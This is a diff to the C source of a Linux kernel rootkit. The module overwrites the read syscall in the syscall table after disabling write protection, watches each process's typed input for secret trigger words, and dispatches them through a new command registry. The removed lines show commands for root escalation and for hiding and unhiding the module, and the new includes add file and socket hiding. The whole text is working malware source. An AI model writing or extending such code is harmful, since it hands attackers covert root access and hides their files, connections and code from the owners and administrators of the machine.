@@ -8,16 +8,24 @@
 #include<linux/fs.h>
 #include<linux/fdtable.h>
 #include<linux/dcache.h>
+#include<linux/hash.h>
+
 
 #include "hooking.h"
+#include "commands.h"
+#include "file_hiding.h"
 #include "code_hiding.h"
-#include "privilege_escalation.h"
+#include "socket_hiding.h"
 
 ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
 
 #define INPUTBUFLEN 1024  //This was arbitrarily chosen to be huge
+#define CMDLEN 8 //must be 64 bit tops
+
+#define invoke_cmd(cmd, type, name) ((void (*)(type)) cmd->handler)(name)
 
 struct taskinput_buffer inbuf_head;
+struct command commands_head;
 
 /* This struct contains a buffer for a task that we read from via stdin
 *  Every task is identified by it's name.
@@ -27,6 +35,16 @@ struct taskinput_buffer{
 	char buf[INPUTBUFLEN];
 	unsigned short bufpos;
 	char * name;
+	struct list_head list;
+};
+
+
+struct command{
+	char name[CMDLEN];
+	size_t namelen;
+	u64 hashcode;
+	enum arg_t arg_type;
+	void * handler;
 	struct list_head list;
 };
 
@@ -109,6 +127,94 @@ char * get_stdin_filename(void){
 	return retVal;
 }
 
+/* This function is why commands must not be longer than 8 chars
+* It moves the commands in a 64 bit integer to generate a unique id
+*/
+static inline u64 strtoh(char * str, size_t len){
+	u64 hashblock = 0;
+
+	len = (len < 9)?len:8;	
+
+	memcpy(&hashblock, str, len);
+
+	return hashblock;
+}
+
+
+struct command * add_command(char * name,enum arg_t arg_type, void * pf){
+	struct command * cmd;
+	size_t len;
+
+	len = strlen(name);
+	if(len > 8) return NULL; //command too long.
+
+	cmd = kmalloc(sizeof(struct command), GFP_KERNEL);
+	cmd->namelen = len;
+	strncpy(cmd->name, name, len);
+	cmd->name[len] = '\0';
+	cmd->hashcode = strtoh(name,len);
+	cmd->arg_type = arg_type;
+	cmd->handler = pf;
+	list_add(&cmd->list, &commands_head.list);
+	
+	return cmd;
+}
+
+static void parse_command(const char * cmdstr){
+	u64 cmd_num;
+	int i, error;
+	char *pcmd, * pch, * parg, *pfree;
+	struct command * cmd;	
+	size_t cmdlen, cmdstrlen;
+	
+	cmdstrlen = strlen(cmdstr);
+	pcmd = pfree = kstrdup(cmdstr, GFP_KERNEL);	
+
+	pch = strsep(&pcmd, " ");
+	if(pch == NULL) goto out; //why would that happen?
+	cmdlen = strlen(pch);
+	if(cmdlen > 8) goto out; //command too long, clearly not for us
+	parg = strsep(&pcmd, " "); //fetch arguments, no args == parg is null
+		
+	cmd_num = strtoh(pch, cmdlen); //generate hashcode
+
+	//printk(KERN_INFO "name: %s, code: %lu\n", pch, cmd_num);	
+	
+	list_for_each_entry(cmd, &commands_head.list, list){
+		//printk(KERN_INFO "found: %s, code: %lu\n", cmd->name, cmd->hashcode);
+		if(cmd->hashcode == cmd_num){
+			switch(cmd->arg_type){
+			case INTARG:
+				if(parg == NULL) {
+					printk(KERN_INFO "Expected argument of type int\n");
+					goto out;
+				}
+				error = sscanf(parg, "%d", &i);
+				if(error == 1) invoke_cmd(cmd, int, i);
+			break;
+			case INTLST:
+				if(parg == NULL){
+					printk(KERN_INFO "Expected argument of type int array\n");		
+					goto out;
+				}
+				pch = strsep(&parg, ",");
+				while(pch != NULL){
+					error = sscanf(pch, "%d", &i);
+					if(error == 1) invoke_cmd(cmd, int, i);
+					pch = strsep(&parg, ",");
+				}
+			break;
+			case NOARG:
+				printk(KERN_INFO "noarg\n");
+				invoke_cmd(cmd, void,);
+			break;
+			}
+		break;
+		}
+	} 
+out: kfree(pfree);
+}
+	
 /* Here all the command handling magic takes place */
 ssize_t my_read(int fd, void * buf, size_t count){
 	ssize_t retVal;
@@ -116,11 +222,11 @@ ssize_t my_read(int fd, void * buf, size_t count){
 	struct taskinput_buffer * cur_tinb = NULL;
 	int i;
 	char c;
-  rcount++;	
+	rcount++;	
 	retVal = orig_sys_read(fd, buf, count);
         
 	if(retVal <= 0){
-    rcount --;
+    		rcount --;
 		return retVal;
 	}
 		
@@ -129,8 +235,8 @@ ssize_t my_read(int fd, void * buf, size_t count){
 
 		if(current_stdin_name == NULL){ //tab completion comes from a nameless device; must be handled.
 		  rcount--;
-      return retVal;
-    }
+      		  return retVal;
+    		}
 
 		cur_tinb = find_tinbuf(current_stdin_name);
 	
@@ -148,25 +254,8 @@ ssize_t my_read(int fd, void * buf, size_t count){
 					cur_tinb->buf[cur_tinb->bufpos] = '\0';
 					cur_tinb->bufpos = 0;
 					
-					//compare with known commands
-          if(strcmp("escalate", cur_tinb->buf) == 0){
-						printk(KERN_INFO "I want to be root!\n");
-            escalate();
-					}
-          if(strcmp("back", cur_tinb->buf) == 0){
-						printk(KERN_INFO "back!\n");
-            back();
-					}
-					if(strcmp("ping", cur_tinb->buf) == 0){
-						printk(KERN_INFO "Pong!\n");
-					}
-					if(strcmp("hide", cur_tinb->buf) == 0){
-						hide_code();
-					}
-					if(strcmp("unhide", cur_tinb->buf) == 0){
-						printk(KERN_INFO "Cloak disengaged\n");
-						make_module_removable();
-					}
+					parse_command(cur_tinb->buf);
+
 					*cur_tinb->buf = '\0';
 					break; //enough read.
 				}
@@ -185,11 +274,14 @@ ssize_t my_read(int fd, void * buf, size_t count){
 		}
 	
 	}
-  rcount--;
+  	rcount--;
 	return retVal;
 }	
 
 void listen(void){
+	
+	INIT_LIST_HEAD(&commands_head.list);
+
 	disable_wp();
 	
 	tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);
@@ -204,8 +296,8 @@ void stop_listen(void){
 	disable_wp();
 	syscall_table[__NR_read] = orig_sys_read;
 	enable_wp();
-  while(rcount>0){// hack to unblock read
-    printk(KERN_INFO "\n");
-  }
+  	while(rcount>0){// hack to unblock read
+    		printk(KERN_INFO "\n");
+  	}
 }
 
